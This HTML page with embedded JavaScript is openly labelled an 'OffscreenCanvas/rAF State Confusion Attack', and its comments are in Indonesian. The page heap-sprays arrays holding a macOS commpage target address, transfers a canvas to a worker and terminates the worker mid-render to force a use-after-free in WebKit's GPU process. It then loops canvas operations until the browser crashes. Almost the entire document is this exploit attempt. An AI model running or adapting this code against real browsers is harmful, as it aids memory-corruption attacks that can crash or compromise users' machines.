<!DOCTYPE html>
<html>
<head>
    <title>OffscreenCanvas/rAF State Confusion Attack</title>
</head>
<body>

    <h1>OffscreenCanvas/rAF State Confusion (Commpage Target)</h1>
    <canvas id="mainCanvas"></canvas>
    <p>Target Commpage Address: 0x0000000FFFFFC320</p>
    <p id="status">INIT: Mempersiapkan OffscreenCanvas dan rAF...</p>
    <div id="log"></div>

    <script>
        // --- KONSTANTA COMM PAGE ---
        const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
        const COMM_PAGE_ASB_TARGET_OFFSET = BigInt("0x320");
        const TARGET_CONTROL_ADDRESS = COMM_PAGE64_BASE_ADDRESS + COMM_PAGE_ASB_TARGET_OFFSET; 
        
        const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
        const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);

        let worker = null;
        let mainCanvas = null;
        let payloadHolders = []; 

        function log(message) {
            document.getElementById('log').innerHTML += '<div>' + message + '</div>';
        }

        // --- FUNGSI HEAP SPRAY PAYLOAD ---
        function sprayPayload() {
            const SPRAY_COUNT = 500;
            const PAYLOAD_SIZE = 64; 

            for (let i = 0; i < SPRAY_COUNT; i++) {
                let payloadArray = new Float64Array(PAYLOAD_SIZE);
                payloadArray[0] = HIGH_WORD; 
                payloadArray[1] = LOW_WORD;
                payloadArray[2] = 2025.12 + i; 
                payloadHolders.push(payloadArray); 
            }
            log(`Phase Spray: ${SPRAY_COUNT} Payload dimasukkan.`);
        }

        // --- FUNGSI EKSEKUSI UTAMA rAF ---
        function rAFCallback() {
            // Callback ini berjalan tepat sebelum frame dirender.
            // Kita gunakan ini untuk meyakinkan WebKit bahwa Canvas masih hidup, 
            // padahal kita akan mencoba menghancurkannya.
            
            // 1. Memicu JIT/Heap Grooming di Timing Paling Kritis
            sprayPayload(); 
            
            // 2. Memicu Dereference pada Objek yang Dicurigai Corrupt
            if (mainCanvas) {
                try {
                    // Memicu operasi grafis yang kompleks
                    let ctx = mainCanvas.getContext('2d');
                    ctx.fillStyle = `rgb(${LOW_WORD & 0xFF}, ${HIGH_WORD & 0xFF}, 0)`; 
                    ctx.fillRect(0, 0, 10, 10);
                    
                    // Trigger final: Akses properti objek yang mungkin ditimpa
                    let data = ctx.getImageData(0, 0, 1, 1).data;
                    let crashValue = data[0] + data[1]; 

                } catch(e) {
                    log("JS Error/Crash Trigger: " + e.message);
                }
            }
            // Lanjutkan rAF sampai crash terjadi
            window.requestAnimationFrame(rAFCallback); 
        }


        // --- FUNGSI UTAMA ATTACK ---
        function runCanvasAttack() {
            mainCanvas = document.getElementById('mainCanvas');
            const offscreen = mainCanvas.transferControlToOffscreen();

            log("Phase 1: Transfer Control ke OffscreenWorker.");
            worker = new Worker('worker_canvas.js');

            // Kirim OffscreenCanvas ke Worker untuk dimanipulasi
            worker.postMessage({ cmd: 'start', canvas: offscreen }, [offscreen]);

            // 2. Memicu rAF (Timer Kritis)
            window.requestAnimationFrame(rAFCallback);
            log("Phase 2: rAF Callback Aktif.");

            // 3. Memicu Corrupt State (Mempercepat Worker Terminate)
            // Kita coba terminasi Worker saat ia sedang memproses Canvas
            setTimeout(() => {
                log("Phase 3: TERMINATE Worker (Memaksa UAF di GPU Thread!).");
                worker.terminate();
                
                // Hapus referensi untuk membantu GC (diperlukan)
                worker = null; 
            }, 100); 
            
        }
        
        document.addEventListener('DOMContentLoaded', () => {
             if (!window.OffscreenCanvas) {
                 document.getElementById('status').textContent = 'Gagal: OffscreenCanvas tidak didukung.';
                 return;
             }
             document.getElementById('status').textContent = 'Memulai rangkaian OffscreenCanvas Attack...';
             setTimeout(runCanvasAttack, 50);
             document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah UAF/Confusion di GPU Process.';
        });

    </script>
</body>
</html>
